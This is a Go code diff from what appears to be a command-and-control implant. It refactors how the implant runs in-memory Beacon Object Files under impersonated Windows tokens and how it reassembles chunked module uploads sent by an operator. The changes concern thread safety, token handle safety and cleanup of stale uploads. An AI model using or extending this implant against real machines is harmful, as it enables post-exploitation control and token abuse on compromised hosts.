@@ -103,9 +103,9 @@ func ensureTokenContextForBOF() func() {
 }
 
 func executeBOFPlatform(bofBytes []byte, args []byte) (string, error) {
-	// Ensure thread safety for BOF execution
-	bofExecutionMutex.Lock()
-	defer bofExecutionMutex.Unlock()
+	// BOF execution serialization is now handled inside LoadWithMethodAndTimeout
+	// via bofExecutionMutex, which protects the global bofOutputBuffer and
+	// template variables from concurrent access.
 
 	// Check if we need to apply token context
 	needsTokenContext := false
@@ -215,12 +215,13 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 		&dupToken,
 	)
 	if err != nil {
-		// Try with the original token
-		dupToken = tokenToUse
-	} else {
-		// We duplicated the token, so we need to close it later
-		defer CloseHandle(dupToken)
+		// DuplicateTokenEx failed -- do NOT fall back to the shared handle,
+		// as using it directly is unsafe (concurrent use / double-close).
+		// execute without impersonation instead.
+		return Load(bofBytes, args)
 	}
+	// We duplicated the token, so we need to close it later
+	defer CloseHandle(dupToken)
 
 	// Apply impersonation using ImpersonateLoggedOnUser
 	err = ImpersonateLoggedOnUser(dupToken)
@@ -238,25 +239,6 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 
 	if execErr != nil {
 		return "", execErr
-	}
-
-	return output, nil
-}
-
-// executeBOFPlatformAsync is for async BOF execution with 30-minute timeout
-func executeBOFPlatformAsync(bofBytes []byte, args []byte) (string, error) {
-	// Ensure thread safety for BOF execution
-	bofExecutionMutex.Lock()
-	defer bofExecutionMutex.Unlock()
-
-	// For async BOF, we handle token context differently (in the goroutine)
-	// So just log and execute
-
-	// Use LoadWithTimeout for 30-minute timeout
-	output, err := LoadWithTimeout(bofBytes, args, 30*time.Minute)
-
-	if err != nil {
-		return "", err
 	}
 
 	return output, nil
@@ -286,6 +268,7 @@ func (cq *WorkQueue) processBOF(cmd Msg) OpResult {
 		// Successfully parsed JSON - extract template, BOF data, and arguments
 		if bofWrapper.Templates != nil {
 			SetBOFTemplate(bofWrapper.Templates)
+			SetCOFFTemplate(bofWrapper.Templates)
 		}
 		// Use bof_data if present, otherwise chunk_data
 		if bofWrapper.BOFData != "" {
@@ -317,18 +300,9 @@ func (cq *WorkQueue) processBOF(cmd Msg) OpResult {
 
 	// Log BOF details and current token context
 
-	// Debug: Log current token state
-	if globalTokenStore != nil {
-		globalTokenStore.mu.RLock()
-		if globalTokenStore.NetOnlyHandle != 0 {
-		} else if globalTokenStore.IsImpersonating {
-		} else {
-		}
-		globalTokenStore.mu.RUnlock()
-	}
-
 	// Get BOF arguments - check multiple sources
 	var bofArgs []byte
+
 	// Priority 1: Top-level Arguments field
 	if cmd.Arguments != "" {
 		decodedArgs, err := base64.StdEncoding.DecodeString(cmd.Arguments)
@@ -436,33 +410,54 @@ func (cq *WorkQueue) processBOF(cmd Msg) OpResult {
 
 // ChunkMeta tracks chunked BOF uploads
 type ChunkMeta struct {
-	Filename    string
-	TotalChunks int
-	Chunks      map[int]string // chunk number -> base64 data
-	Arguments   string         // base64-encoded packed arguments
-	ReceivedAt  time.Time
+	Filename     string
+	TotalChunks  int
+	Chunks       map[int]string // chunk number -> base64 data
+	Arguments    string         // base64-encoded packed arguments
+	ReceivedAt   time.Time
+	LastAccessed time.Time // last time this entry was touched
 }
+
+const bofChunkStaleTimeout = 5 * time.Minute
 
 var (
 	bofChunks      = make(map[string]*ChunkMeta) // commandID -> chunk info
 	bofChunksMutex sync.Mutex
 )
 
+// cleanupStaleBOFChunks removes bofChunks entries that haven't been accessed
+// within bofChunkStaleTimeout. Must be called with bofChunksMutex held.
+func cleanupStaleBOFChunks() {
+	now := time.Now()
+	for id, info := range bofChunks {
+		if now.Sub(info.LastAccessed) > bofChunkStaleTimeout {
+			delete(bofChunks, id)
+		}
+	}
+}
+
 // handleChunkedBOF handles multi-chunk BOF uploads
 func (cq *WorkQueue) handleChunkedBOF(cmd Msg) OpResult {
 	bofChunksMutex.Lock()
 	defer bofChunksMutex.Unlock()
 
+	// Clean up any stale incomplete uploads on each new chunk arrival
+	cleanupStaleBOFChunks()
+
 	// Get or create chunk info
+	now := time.Now()
 	chunkInfo, exists := bofChunks[cmd.CID]
 	if !exists {
 		chunkInfo = &ChunkMeta{
-			Filename:    cmd.Filename,
-			TotalChunks: cmd.TotalChunks,
-			Chunks:      make(map[int]string),
-			ReceivedAt:  time.Now(),
+			Filename:     cmd.Filename,
+			TotalChunks:  cmd.TotalChunks,
+			Chunks:       make(map[int]string),
+			ReceivedAt:   now,
+			LastAccessed: now,
 		}
 		bofChunks[cmd.CID] = chunkInfo
+	} else {
+		chunkInfo.LastAccessed = now
 	}
 
 	// Extract actual chunk data from JSON wrapper if present
@@ -549,15 +544,22 @@ func (cq *WorkQueue) handleChunkedBOFAsync(cmd Msg) OpResult {
 	bofChunksMutex.Lock()
 	defer bofChunksMutex.Unlock()
 
+	// Clean up any stale incomplete uploads on each new chunk arrival
+	cleanupStaleBOFChunks()
+
+	now := time.Now()
 	chunkInfo, exists := bofChunks[cmd.CID]
 	if !exists {
 		chunkInfo = &ChunkMeta{
-			Filename:    cmd.Filename,
-			TotalChunks: cmd.TotalChunks,
-			Chunks:      make(map[int]string),
-			ReceivedAt:  time.Now(),
+			Filename:     cmd.Filename,
+			TotalChunks:  cmd.TotalChunks,
+			Chunks:       make(map[int]string),
+			ReceivedAt:   now,
+			LastAccessed: now,
 		}
 		bofChunks[cmd.CID] = chunkInfo
+	} else {
+		chunkInfo.LastAccessed = now
 	}
 
 	// Extract actual chunk data from JSON wrapper if present
